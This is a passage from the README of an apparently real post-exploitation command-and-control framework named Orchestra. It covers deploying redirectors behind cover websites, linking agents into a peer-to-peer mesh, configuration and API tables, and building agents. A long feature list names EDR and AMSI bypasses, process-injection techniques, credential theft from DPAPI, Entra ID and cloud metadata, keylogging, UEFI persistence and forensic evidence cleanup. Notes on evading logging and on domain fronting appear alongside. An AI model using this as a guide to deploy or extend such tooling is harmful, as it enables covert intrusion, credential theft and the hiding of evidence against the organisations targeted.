                          │  Cover site  │
                          │  (static)    │
                          │              │───HTTPS───►┌──────────┐
                          │  URI matcher │            │  C2      │
                          │  (profile)   │            │  Server  │
                          └──────────────┘            └──────────┘
                                │
                                │ Registration/Heartbeat
                                └────────────────────────►
```

### Deployment Steps

1. **Provision VPS** — Any Linux VPS with public IP
2. **Obtain TLS certificate** — Use Let's Encrypt or custom CA
3. **Create cover content** — Static HTML/CSS/JS in a directory
4. **Write a malleable profile** — Matching the cover site's theme
5. **Start redirector** — Registers with Orchestra server automatically

```bash
# Generate certificates
certbot certonly --standalone -d redirect1.example.com

# Start redirector
./redirector \
    --listen-addr 0.0.0.0:443 \
    --c2-addr 10.0.0.1:8443 \
    --profile profiles/redirect1.profile \
    --cover-content /var/www/redirect1/ \
    --tls-cert /etc/letsencrypt/live/redirect1.example.com/fullchain.pem \
    --tls-key /etc/letsencrypt/live/redirect1.example.com/privkey.pem \
    --server-api https://10.0.0.1:8443 \
    --server-token "$(cat /opt/orchestra/token)"
```

### URI Matching

The redirector loads URI patterns from the malleable profile. Requests matching any configured URI (from `[http_get].uri` or `[http_post].uri`) are forwarded to the upstream C2 server. All other requests receive cover content from the configured directory.

### Registration and Heartbeat

On startup, the redirector registers with the Orchestra server via `POST /api/redirector/register`. It then sends heartbeats every 60 seconds via `POST /api/redirector/heartbeat`. The server marks redirectors as stale if no heartbeat is received within 300 seconds (configurable).

### Failover Behavior

The agent's `FailoverState` manages redirection chains:
1. **Sticky sessions** — Stick with the current endpoint for up to 10 successful requests
2. **Exponential backoff** — On failure, advance to next redirector with backoff (2s → 4s → 8s → ... → 60s max)
3. **Full cycle detection** — After trying all redirectors, fall back to direct C2
4. **Reconsideration** — After direct C2, periodically retry redirectors

### Managing Redirectors from Server CLI

```bash
# Register a new redirector
orchestra-server redirector add --url https://redirect1.example.com --profile-name cloudfront

# List all redirectors
orchestra-server redirector list

# Remove a redirector
orchestra-server redirector remove --identifier redirector-id-here
```

---

## P2P Mesh Networking

Agents can form a peer-to-peer mesh for lateral communication, C2 relay
through nested networks, and resilient routing that survives individual link
failures.

### Mesh Topology

```
                    ┌──────────┐
                    │  Server  │
                    └────┬─────┘
                         │
                    ┌────▼─────┐
                    │ Agent A  │ (parent, internet-facing)
                    └─┬──┬──┬─┘
                      │  │  │
               ┌──────┘  │  └──────┐
               │         │         │
          ┌────▼───┐ ┌───▼───┐ ┌──▼────┐
          │Agent B │ │Agent D│ │Agent E│
          │  ◄──►  │ └───────┘ └───────┘
          └─┬──┬───┘
       peer│  │child
          ┌─┘  └──┐
     ┌────▼──┐ ┌──▼───┐
     │Agent C│ │Agent │
     │       │ │  F   │
     └───────┘ └──────┘
```

- **Parent/Child**: Hierarchical C2 relay (tree backbone).
- **Peer**: Lateral links for direct agent-to-agent communication.

### MeshMode Comparison

| Mode | Peer Links | Route Discovery | Best For |
|------|:----------:|:---------------:|----------|
| **Tree** | ✗ | ✗ | Maximum OPSEC — all traffic funnels through parents |
| **Mesh** | ✓ | ✓ | Maximum resilience — any agent reaches any other |
| **Hybrid** | ✓ | ✓ | Balanced (default) — tree backbone + peer shortcuts |

### Quick Mesh Setup

```bash
# 1. Link two agents (server command → parent agent)
curl -X POST https://c2.example.com/api/mesh/connect \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"parent_agent_id":"DESKTOP-WIN10","child_address":"10.0.0.20:4443"}'

# 2. View mesh topology
curl https://c2.example.com/api/mesh/topology \
  -H "Authorization: Bearer $TOKEN"

# 3. View mesh statistics
curl https://c2.example.com/api/mesh/stats \
  -H "Authorization: Bearer $TOKEN"

# 4. Broadcast command to all mesh agents
curl -X POST https://c2.example.com/api/mesh/broadcast \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"command":"GetSystemInfo"}'
```

### Security Model

| Feature | Description |
|---------|-------------|
| **Server-signed certificates** | Each agent receives an Ed25519-signed mesh certificate (24h lifetime) |
| **Per-link encryption** | X25519 ECDH → ChaCha20-Poly1305 on every link |
| **Key rotation** | Automatic 4-hour key rotation per link with overlap period |
| **Compartment isolation** | Agents only peer with agents in the same compartment |
| **Kill switch** | Instantly terminate all P2P links mesh-wide |
| **Quarantine** | Isolate a compromised agent while keeping server connection |

> See [docs/P2P_MESH.md](docs/P2P_MESH.md) for the full mesh reference.

---

## Configuration Reference

### Server TOML Configuration Fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `http_addr` | string | `0.0.0.0:8443` | Operator HTTPS listener address |
| `agent_addr` | string | `0.0.0.0:8444` | Agent listener address |
| `agent_shared_secret` | string | (required) | Base64-encoded PSK for agent authentication |
| `admin_token` | string | (required) | Bearer token for operator API access |
| `tls_cert_path` | path | (required) | Path to TLS certificate PEM |
| `tls_key_path` | path | (required) | Path to TLS private key PEM |
| `static_dir` | path | `orchestra-server/static` | Static files for web dashboard |
| `audit_log_path` | path | `orchestra-audit.jsonl` | Path for JSONL audit log |
| `command_timeout_secs` | u64 | `30` | Max wait for agent command response |
| `builds_output_dir` | path | `builds` | Output dir for built agent payloads |
| `module_aes_key` | string | — | Base64 AES-256 key baked into built agents |
| `allow_local_builds` | bool | `false` | Allow loopback/private IP in build target |

### Server CLI Arguments

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--config` | path | `orchestra-server.toml` | Configuration file path |
| `--admin-token` | string | (from config) | Override admin authentication token |
| `--agent-secret` | string | (from config) | Override agent shared secret |
| `--profile-dir` | path | `profiles/` | Malleable profile directory |
| `--profile` | string | `default` | Active malleable profile name |

### REST API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `GET` | `/api/agents` | Bearer | List connected agents |
| `POST` | `/api/agents/<id>/command` | Bearer | Send command, get response |
| `POST` | `/api/build` | Bearer | Queue an agent build job |
| `GET` | `/api/build/status/<job_id>` | Bearer | Poll build job status and log |
| `GET` | `/api/build/<job_id>/download` | Bearer | Download encrypted agent payload |
| `GET` | `/api/info/fingerprint` | Bearer | Get server cert SHA-256 fingerprint |
| `GET` | `/api/audit` | Bearer | Retrieve audit log entries |

### Server Subcommands

| Command | Arguments | Description |
|---------|-----------|-------------|
| `validate-profile` | `--path <file>` | Validate a malleable profile TOML file |
| `redirector add` | `--url <url>`, `--profile-name <name>` | Register a redirector with the server |
| `redirector remove` | `--identifier <id>` | Remove a redirector |
| `redirector list` | — | List all registered redirectors |

### Redirector CLI Arguments

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--listen-addr` | socket addr | `0.0.0.0:8080` | Local bind address |
| `--c2-addr` | socket addr | (required) | Upstream C2 server address |
| `--profile` | path | (required) | Malleable profile file for URI matching |
| `--cover-content` | path | `./cover/` | Directory with static cover content |
| `--tls-cert` | path | None | TLS certificate PEM |
| `--tls-key` | path | None | TLS private key PEM |
| `--server-api` | url | None | Orchestra server API URL for registration |
| `--server-token` | string | None | Authentication token for server API |

### Agent Build-Time Features

| Feature | Purpose |
|---------|---------|
| `adcs-attacks` | Active Directory Certificate Services attack modules (ESC1-ESC8 discovery and abuse) |
| `adaptive-timing` | Adaptive callback timing based on observed traffic |
| `browser-data` | Browser stored-data recovery |
| `callback-inject` | Injection via kernel callback vectors — APC, window message, and timer callback dispatch |
| `cet-bypass` | CET/shadow-stack bypass support |
| `cfg-bypass` | Control Flow Guard bypass — bitset manipulation, CFG-valid trampolines, dispatch override |
| `com-hijack` | Registry-free COM object hijacking via SxS manifest activation contexts |
| `context-only` | Context-only injection — SetThreadContext IP/SP rewrite with restore trampoline |
| `container-escape` | Linux container escape, cloud metadata credential theft, and cloud IAM pivoting |
| `coop` | Counterfeit Object-Oriented Programming — C++ vtable dispatch chains that pass CFI/CFG checks |
| `delayed-stomp` | Delayed module-stomp injection |
| `default` | Default feature set enabled when no features are specified — includes `manual-map` |
| `dev` | Development build toggles |
| `direct-syscalls` | Direct/indirect syscall infrastructure |
| `doh-transport` | DNS-over-HTTPS C2 transport; ⚠️ experimental |
| `dpapi-backup` | DPAPI domain backup key retrieval and secret decryption via MS-BKRP |
| `ebpf` | Linux eBPF-based evasion support |
| `embedded_driver` | Embedded driver payload packaging |
| `env-validation` | Environment validation checks |
| `entra-app-abuse` | Entra ID OAuth application abuse for persistent Graph API access |
| `entra-attacks` | Entra ID credential attack modules (PRT theft, token abuse, and cloud privilege ops) |
| `entra-ptc` | Entra ID Pass-the-Certificate — OAuth2 client-credentials with RS256 JWT assertion |
| `etw-check` | ETW auto-logger detection |
| `evanesco` | Continuous memory hiding |
| `fiber-inject` | Fiber-based injection — creates remote fiber and schedules it for execution |
| `evasion-transform` | Runtime EDR signature transformation |
| `forensic-cleanup` | Prefetch/MFT/USN evidence cleanup |
| `graph-transport` | Microsoft Graph API covert C2 transport |
| `hardware-persistence` | Hardware/firmware persistence and DMA-oriented tradecraft modules |
| `hci-research` | HCI telemetry capture |
| `hot-reload` | Configuration hot reload |
| `http-transport` | HTTP/S malleable C2 transport; ⚠️ experimental |
| `hw-bp-hook` | Hardware-breakpoint hook framework |
| `hwbp-amsi` | Hardware-breakpoint AMSI/ETW bypass mode |
| `kernel-callback` | Kernel callback overwrite support |
| `kerberos-relay` | Kerberos relay attack via COM cross-session activation |
| `lolbin-xwizard` | COM Scriptlet execution via xwizard.exe and alternative LOLBIN dispatchers |
| `lsa-whisperer` | LSA Whisperer support |
| `manual-map` | Reflective/manual module mapping |
| `module-stomp` | Module stomping — overwrites legitimate DLL in memory with payload |
| `memory-guard` | Heap region encryption during idle windows |
| `mobile-postexp` | Android and iOS persistence and post-exploitation modules |
| `module-signatures` | Signed module verification |
| `strict-module-key` | Hard error if no runtime module signing key — production hardening |
| `network-discovery` | ARP scan, ping sweep, port scan |
| `office-addin` | Office add-in persistence via OneDrive sync — fleet-wide persistence through Microsoft sync |
| `outbound-c` | Outbound agent connection mode |
| `lpe` | Local privilege escalation modules |
| `macos-postexp` | macOS post-exploitation modules (TCC, SIP, Keychain, XPC) |
| `p2p-tcp` | Peer-to-peer TCP mesh networking |
| `pac-bypass` | ARM64 BTI/PAC bypass support |
| `page-fault-exec` | Page-fault driven execution — payload pages encrypted under PAGE_NOACCESS, decrypted on fault |
| `perf-optimize` | Performance optimization toggles |
| `persistence` | Cross-platform persistence mechanisms |
| `phantom-dll-hollow` | Phantom DLL hollowing — maps DLL via NtCreateSection, never written to disk |
| `ppid-spoofing` | Parent-process ID spoofing support |
| `quic-transport` | QUIC/HTTP3 C2 transport |
| `recon` | Automated internal reconnaissance and attack-path discovery modules |
| `reflective-loader` | NtCreateSection/NtMapViewOfSection reflective DLL loader |
| `remote-assist` | Screen capture and input simulation |
| `s4u-abuse` | S4U2Self/S4U2Proxy Kerberos delegation abuse — forges service tickets for arbitrary users |
| `section-map` | Section mapping injection — maps payload via NtCreateSection/NtMapViewOfSection into target |
| `self-reencode` | Runtime metamorphic re-encoding |
| `seh-anti-debug` | SEH-based anti-debugging — deeply nested VEH handler chains that crash analysis tools |
| `shadow-credentials` | Shadow Credentials attack — Kerberos authentication via certificate added to target's msDS-KeyCredentialLink |
| `smb-pipe-transport` | SMB named pipe C2 transport; ⚠️ experimental |
| `ssh-transport` | SSH subsystem C2 transport; ⚠️ experimental |
| `stack-spoof` | Call-stack spoofing support |
| `stealth` | Stealth feature bundle |
| `surveillance` | Screenshot, keylogger, and clipboard monitoring |
| `syscall-emulation` | User-mode syscall emulation |
| `thread-ctx-encrypt` | Encrypt thread context/register state during sleep |
| `thread-hijack` | Thread hijacking — suspends existing thread and redirects execution to payload |
| `threadpool-inject` | Threadpool injection — queues payload via TP_WORK/TP_TIMER/TP_WAIT to hijack system threadpool |
| `token-impersonation` | Token-only impersonation support |
| `traffic-normalization` | Traffic normalization toggles |
| `trampoline-spoof` | Multi-frame trampoline stack spoofing |
| `transacted-hollowing` | NTFS transaction-backed hollowing |
| `unsafe-runtime-rewrite` | Runtime rewrite support |
| `uefi-persistence` | UEFI firmware-level persistence — NVRAM manipulation, ESP driver deployment, capsule delivery |
| `vss-pivot` | VSS shadow copy pivoting — reads locked SAM/NTDS through shadow copy paths |
| `wmi-persistence` | WMI permanent event subscriptions with encrypted cloud payloads |
| `write-raid-amsi` | Write-raid AMSI bypass mode |
| `wsl2-evasion` | WSL2 evasion layer — executes ELF binaries and relays C2 through WSL2 VM |

### Environment Variables

| Variable | Context | Description |
|----------|---------|-------------|
| `ORCHESTRA_C_ADDR` | Agent build | Server address baked in at compile time → `SYS_C_ADDR` |
| `ORCHESTRA_C_SECRET` | Agent build | Pre-shared key baked in at compile time → `SYS_C_SECRET` |
| `ORCHESTRA_C_CERT_FP` | Agent build | Server certificate SHA-256 fingerprint → `SYS_C_CERT_FP` |
| `ORCHESTRA_MODULE_AES_KEY` | Agent build | Module decryption key baked in → `SYS_MODULE_KEY` |
| `ORCHESTRA_C_MTLS_CERT` | Agent build / runtime | mTLS client certificate PEM path |
| `ORCHESTRA_C_MTLS_KEY` | Agent build / runtime | mTLS client key PEM path |
| `ORCHESTRA_SECRET` | Agent runtime | Fallback shared secret (debug builds only) |
| `ORCHESTRA_CONFIG_HMAC` | Agent runtime | Expected config HMAC |

### Launcher CLI Arguments

| Flag | Type | Description |
|------|------|-------------|
| `--url` | string | HTTPS URL of encrypted payload |
| `--key` | string | Base64-encoded AES-256 decryption key |
| `--allow-insecure-http` | bool | Allow HTTP downloads (dev only) |

### Console CLI Arguments

| Flag | Type | Description |
|------|------|-------------|
| `--target` | string | Agent address (IP:PORT) |
| `--key` | string | Base64 pre-shared key |
| `--tls` | bool | Enable mTLS transport |
| `--ca-cert` | path | CA certificate PEM |
| `--client-cert` | path | Client certificate PEM |
| `--client-key` | path | Client key PEM |
| `--insecure` | bool | Skip certificate verification |
| `--sni` | string | TLS SNI hostname |

---

## Operational Security Notes

### No PowerShell or wmic

All lateral movement uses native COM, WinRM SOAP/WS-Man, and direct NT API calls. No `powershell.exe` is ever spawned. This avoids:
- PowerShell Script Block Logging (Event ID 4104)
- AMSI integration in PowerShell
- Constrained Language Mode restrictions
- Command-line auditing in Security Event Log

### No RWX Memory

The agent never allocates `PAGE_EXECUTE_READWRITE` (RWX) memory. All code follows the RW→RX pattern:
1. Allocate `PAGE_READWRITE` (RW)
2. Write payload
3. `NtProtectVirtualMemory` → `PAGE_EXECUTE_READ` (RX)
4. Execute

On Linux, this is `mmap(PROT_READ|PROT_WRITE)` → write → `mprotect(PROT_READ|PROT_EXEC)`.

### Agent ID Never Plaintext

Agent identifiers are never transmitted in plaintext. All communications are encrypted with AES-256-GCM (or X25519 ECDH + HKDF when forward secrecy is enabled). Agent IDs are short 8-character hex strings derived from the session key, not hostnames or usernames.

### No Static Mut

All shared mutable state uses thread-safe primitives: `Arc<Mutex<T>>`, `Arc<RwLock<T>>`, `AtomicUsize`, `DashMap`, and `DashSet`. No `static mut` is used anywhere in the codebase, eliminating data race potential.

### Malleable Profiles

Malleable profiles ensure every HTTP transaction matches legitimate web traffic patterns. Custom User-Agent strings, realistic URI paths, standard headers, and data transforms (Base64, Mask, NetBIOS) make individual requests indistinguishable from normal browsing.

### Redirection Chains

Multi-hop redirector chains with sticky sessions ensure:
- The true C2 server IP is never exposed to the target network
- Each redirector presents legitimate cover traffic
- Failover occurs transparently with exponential backoff
- Health monitoring via heartbeats removes stale redirectors

### Domain Fronting

When used behind a CDN (CloudFront, Akamai, etc.), domain fronting:
- Sends TLS SNI matching the CDN's front domain
- Sends HTTP `Host` header matching the actual redirector/C2 endpoint
- CDN edge nodes route based on `Host` header to the correct origin
- Network monitoring sees only connections to legitimate CDN domains

---

## Building and Development

### Build Commands

```bash
# Full workspace check, including tests/benches/examples
cargo check --workspace --all-targets

# Build server (release)
cargo build --release --package orchestra-server

# Build agent for Windows (with HTTP transport + full evasion suite)
cargo build --release --package agent \
    --target x86_64-pc-windows-gnu \
    --features "http-transport,outbound-c,direct-syscalls,memory-guard,stack-spoof,cet-bypass,token-impersonation,forensic-cleanup,write-raid-amsi,syscall-emulation,evanesco,evasion-transform"

# Build agent for Linux
cargo build --release --package agent \
    --features "http-transport,outbound-c" \
    --target x86_64-unknown-linux-gnu

# Build redirector
cargo build --release --package redirector

# Build console
cargo build --release --package console

# Build launcher
cargo build --release --package launcher
```

### Test Commands

```bash
# Run all tests
cargo test --workspace

# Focused regressions for parallel proc-macro tests and Linux direct syscalls
cargo test -p junk_macro --lib
cargo test -p agent --lib --features direct-syscalls linux_direct_syscall_tests

# Test specific crate
cargo test --package agent --features http-transport
cargo test --package common
cargo test --package orchestra-server
```

### Adding New Injection Techniques

1. Create a new file in `agent/src/injection/` implementing the `Injector` trait
2. Add the variant to `InjectionMethod` enum in `agent/src/injection/mod.rs`
3. Add the variant to `InjectionTechnique` enum in `agent/src/injection_engine.rs`
4. Update the auto-selection logic in `injection_engine.rs`
5. Add feature gate if platform-specific

### Adding New Transform Types

1. Add variant to `TransformType` enum in `agent/src/malleable.rs`
2. Implement `encode()` and `decode()` methods
3. Add variant to `TransformType` enum in `orchestra-server/src/malleable.rs`
4. Update `from_str_ci()` for TOML parsing in both crates
5. Add validation in profile `validate()`

### Cross-Compilation Setup

```bash
# Install targets
rustup target add x86_64-pc-windows-gnu x86_64-pc-windows-msvc aarch64-pc-windows-msvc
rustup target add x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu
rustup target add x86_64-apple-darwin aarch64-apple-darwin

# Install MinGW for Windows GNU and header-backed MSVC wrapper builds on Linux
sudo apt install mingw-w64

# Install Zig.  .cargo/config.toml points Cargo's cc-rs environment at
# scripts/zig-cc-darwin.sh, scripts/zig-cc-windows-msvc.sh, and
# scripts/zig-cc-linux.sh for Darwin, Windows MSVC, and Linux ARM64 targets.
zig version

# Verified warning-free checks used for release validation
cargo check --workspace --all-targets
cargo check --workspace --all-targets --target x86_64-pc-windows-gnu
cargo check --workspace --all-targets --target x86_64-pc-windows-msvc
cargo check --workspace --all-targets --target aarch64-pc-windows-msvc
cargo check --workspace --all-targets --target aarch64-unknown-linux-gnu
cargo check --workspace --all-targets --target x86_64-apple-darwin
cargo check --workspace --all-targets --target aarch64-apple-darwin
```

### Development Scripts

| Script | Purpose |
|--------|---------|
| `scripts/quickstart.sh` | One-command clone → running system |
| `scripts/setup.sh` | Interactive setup wizard |
| `scripts/setup.ps1` | PowerShell setup wizard |
| `scripts/quickbuild.sh` | Quick payload build |
| `scripts/verify-setup.sh` | Verify build environment |
| `scripts/generate-certs.sh` | Generate self-signed TLS certs |
| `scripts/dev-start.sh` | Start server + dev-server |
| `scripts/package.sh` | Package release artifacts |

---

## Documentation

| Document | Description |
|----------|-------------|
| [docs/QUICKSTART.md](docs/QUICKSTART.md) | Step-by-step first run guide |
| [docs/CONFIGURATION.md](docs/CONFIGURATION.md) | Complete configuration reference |
| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | System design and data flows |
| [docs/FEATURES.md](docs/FEATURES.md) | Feature flag reference |
| [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) | Operator command reference |
| [docs/CONTROL_CENTER.md](docs/CONTROL_CENTER.md) | REST API reference |
| [docs/C_SERVER.md](docs/C_SERVER.md) | C2 server internals |
| [docs/MALLEABLE_PROFILES.md](docs/MALLEABLE_PROFILES.md) | Malleable profile authoring guide |
| [docs/P2P_MESH.md](docs/P2P_MESH.md) | P2P mesh networking reference |
| [docs/INJECTION_ENGINE.md](docs/INJECTION_ENGINE.md) | Injection engine reference |
| [docs/SLEEP_OBFUSCATION.md](docs/SLEEP_OBFUSCATION.md) | Sleep obfuscation internals |
| [docs/EVASION.md](docs/EVASION.md) | EDR/AV evasion techniques |
| [docs/LAUNCHER.md](docs/LAUNCHER.md) | Stage-0 launcher reference |
| [docs/REDIRECTOR_GUIDE.md](docs/REDIRECTOR_GUIDE.md) | Redirector deployment guide |
| [docs/FORENSICS.md](docs/FORENSICS.md) | Forensic artifacts and cleanup |
| [docs/POST_EXPLOITATION.md](docs/POST_EXPLOITATION.md) | Post-exploitation techniques |
| [docs/LOCAL_TESTING_GUIDE.md](docs/LOCAL_TESTING_GUIDE.md) | Verified localhost test setup |
| [docs/SECURITY.md](docs/SECURITY.md) | Security model and audit notes |
| [docs/SECURITY_AUDIT.md](docs/SECURITY_AUDIT.md) | External security audit results |
| [docs/INTEGRATION_TEST_WALKTHROUGH.md](docs/INTEGRATION_TEST_WALKTHROUGH.md) | End-to-end integration test record |
